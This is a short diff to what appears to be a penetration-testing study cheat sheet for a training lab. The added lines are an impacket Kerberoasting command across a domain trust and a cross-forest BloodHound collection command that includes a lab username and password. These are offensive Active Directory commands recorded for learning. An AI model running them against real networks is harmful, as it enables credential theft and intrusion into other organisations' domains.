@@ -60,3 +60,7 @@ Linux
 ```
 impacket-GetUserSPNs -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley(a user that can authenticate into the other domain)
 ```
+### Cross-Forest Bloodhound Python
+```
+bloodhound-python -d FREIGHTLOGISTICS.LOCAL -dc ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -c All -u forend@inlanefreight.local -p Klmcargo2
+```
